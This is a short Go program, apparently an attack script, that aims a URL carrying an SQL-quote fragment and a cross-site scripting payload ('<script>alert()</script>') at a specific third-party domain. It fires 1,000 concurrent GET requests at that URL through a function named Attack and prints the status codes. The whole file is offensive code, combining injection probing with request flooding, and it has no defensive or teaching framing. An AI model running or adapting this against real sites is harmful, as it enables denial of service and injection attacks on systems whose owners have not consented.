package main

import (
	"fmt"
	"net/http"
	"runtime"
)

type myResponse struct {
	resp string
}

const URL = "https://ltfbs.com/?id='+1<script>alert()</script>"

func main()  {
	ch := make(chan myResponse)
	defer close(ch)
	for i:=0; i < 1000; i++ {
		go Attack(URL, ch)
		runtime.Gosched()
	}
	for i:=0; i < 1000; i++ {
		fmt.Println((<-ch).resp)
	}
}

func Attack(url string, ch chan<- myResponse)  {
	getresp, _ := http.Get(url)
	ch <- myResponse{getresp.Status}
}
